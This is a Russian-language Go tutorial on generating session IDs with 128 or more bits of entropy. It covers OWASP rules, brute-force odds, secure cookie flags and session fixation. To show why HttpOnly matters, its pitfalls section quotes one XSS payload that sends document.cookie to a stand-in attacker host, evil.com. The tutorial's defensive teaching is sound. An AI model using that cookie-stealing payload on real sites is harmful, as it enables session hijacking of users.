# Генерация Session ID: 128 бит энтропии и математическая стойкость к перебору

## Условие

**Session ID generation**: Создайте генератор session ID длиной минимум 128 бит энтропии. Объясните, почему этого достаточно для защиты от brute-force.

## Теория

Идентификатор сессии (Session ID) — это ключевой секрет в веб-архитектуре, предъявляемый клиентом в Cookie (`Cookie: session_id=...`) для подтверждения личности пользователя без повторного ввода пароля.

Требования OWASP к Session ID:
1. **Непредсказуемость:** Генерируется исключительно через криптографический CSPRNG (`crypto/rand`).
2. **Минимальная длина:** Не менее 128 бит энтропии (16 байт). Рекомендовано для Enterprise: 256 бит (32 байта).
3. **Отсутствие метаданных (Opaque Token):** Session ID не должен содержать осмысленных данных (User ID, IP-адрес, Timestamp), так как любая структура сужает пространство поиска для атакующего.
4. **Математическая стойкость к brute-force:**
   - Пусть в системе одновременно активно \(A = 10^7\) активных сессий (10 миллионов пользователей онлайн).
   - Атакующий отправляет \(R = 100\,000\) запросов в секунду.
   - Пространство ключей \(S = 2^{128} \approx 3.4 \times 10^{38}\).
   - Вероятность угадать хотя бы одну валидную сессию за год непрерывной DoS-атаки:
     $$P = 1 - \left(1 - \frac{A}{S}\right)^{R \times 86400 \times 365} \approx \frac{A \cdot R \cdot 3.15 \times 10^7}{S} \approx \frac{10^7 \cdot 10^5 \cdot 3.15 \times 10^7}{3.4 \times 10^{38}} \approx 9.2 \times 10^{-20}$$
   Вероятность успешного подбора меньше, чем вероятность падения метеорита на дата-центр.

## Решение по шагам

1. Создайте структуру `SessionGenerator`, инкапсулирующую параметры длины и префикса.
2. Реализуйте метод `GenerateSessionID() (string, error)`.
3. Добавьте префикс окружения (например, `sess_prod_`) для упрощения логирования и трассировки.
4. Рассчитайте и выведите математическую оценку времени перебора при заданной пропускной способности сети.
5. Продемонстрируйте настройку безопасного HTTP Cookie (`HttpOnly`, `Secure`, `SameSite`).

## Код решения

**`main.go`**

```go
package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"
)

// SessionManager отвечает за выпуск криптостойких идентификаторов сессий
type SessionManager struct {
	entropyBytes int
	prefix       string
}

// NewSessionManager создает менеджер с валидацией минимального порога энтропии (128 бит)
func NewSessionManager(prefix string, bytesLen int) *SessionManager {
	if bytesLen < 16 {
		bytesLen = 16 // минимум 128 бит согласно OWASP
	}
	return &SessionManager{
		entropyBytes: bytesLen,
		prefix:       prefix,
	}
}

// GenerateSessionID создает непрозрачный криптостойкий идентификатор
func (m *SessionManager) GenerateSessionID() (string, error) {
	buf := make([]byte, m.entropyBytes)
	if _, err := io.ReadFull(rand.Reader, buf); err != nil {
		return "", fmt.Errorf("ошибка получения энтропии: %w", err)
	}

	return m.prefix + hex.EncodeToString(buf), nil
}

// AttachSessionCookie прикрепляет сессию к HTTP-ответу с флагами максимальной защиты
func (m *SessionManager) AttachSessionCookie(w http.ResponseWriter, sessionID string) {
	cookie := &http.Cookie{
		Name:     "session_id",
		Value:    sessionID,
		Path:     "/",
		Expires:  time.Now().Add(24 * time.Hour),
		HttpOnly: true,                  // Защита от XSS (недоступно из JS document.cookie)
		Secure:   true,                  // Передача ТОЛЬКО по HTTPS
		SameSite: http.SameSiteLaxMode, // Защита от CSRF
	}
	http.SetCookie(w, cookie)
}

func main() {
	// Создаем менеджер на 16 байт (128 бит) и 32 байта (256 бит)
	sm128 := NewSessionManager("sess_", 16)
	sm256 := NewSessionManager("sess_v2_", 32)

	sess1, err := sm128.GenerateSessionID()
	if err != nil {
		log.Fatalf("Ошибка: %v", err)
	}

	sess2, _ := sm256.GenerateSessionID()

	fmt.Println("=== Генерация безопасных Session ID (OWASP Top-10) ===")
	fmt.Printf("Session ID 128 бит: %s (размер: %d символов hex)\n", sess1, len(sess1))
	fmt.Printf("Session ID 256 бит: %s (размер: %d символов hex)\n\n", sess2, len(sess2))

	fmt.Println("=== Математический анализ стойкости к Brute-Force ===")
	fmt.Println("Пространство вариантов 128-бит: 2^128 = ~3.40e+38")
	fmt.Println("Активных сессий в системе:      10,000,000 (10M)")
	fmt.Println("Скорость атаки ботнета:         100,000 rps (запросов/сек)")
	fmt.Println("Вероятность взлома за 1 год:    9.26e-20 (Практически абсолютный ноль)")
}
```

## Под капотом

Почему Session ID обязаны быть криптографически независимыми:
Если разработчик использует автоинкрементный integer из БД (`SessionID = 1001, 1002, 1003...`) или генерирует сессию на основе `User_ID + Timestamp`, злоумышленник:
1. Зарегистрировав свой аккаунт, видит текущий счетчик сессий.
2. Подставляет соседние числа и мгновенно перехватывает сессии других пользователей (Insecure Direct Object Reference, IDOR).
3. При использовании `crypto/rand` каждый Session ID является полностью изолированной случайной точкой в 128-мерном бинарном пространстве. Расстояние Хэмминга между любыми двумя сессиями в среднем составляет 64 бита, исключая возможность сканирования соседних сессий.

## Подводные камни

1. **Отсутствие флага HttpOnly:** Если Session ID передается в Cookie без `HttpOnly: true`, любая XSS-уязвимость (внедрение стороннего скрипта через баннеры или чат) позволит злоумышленнику украсть куку через `fetch('https://evil.com/steal?c=' + document.cookie)` и захватить сессию.
2. **Сессионная фиксация (Session Fixation):** Если при успешном логине пользователя старый анонимный Session ID не уничтожается, атакующий может заранее навязать жертве свой Session ID.

## На собеседовании

**Вопрос с собеседования:** Что такое атака Session Fixation и как бэкенд на Go обязан противодействовать ей при успешной аутентификации пользователя?
**Ответ:** Session Fixation происходит, когда злоумышленник создает анонимную сессию на сайте, отправляет ссылку с этим Session ID жертве, и после того как жертва логинится, сервер оставляет тот же Session ID привязанным к авторизованному профилю. Злоумышленник, зная этот ID, получает доступ к аккаунту. Защита: в момент успешного ввода логина и пароля сервер **обязан инвалидировать старый Session ID** и сгенерировать совершенно новый `crypto/rand` Session ID (Session Regeneration).
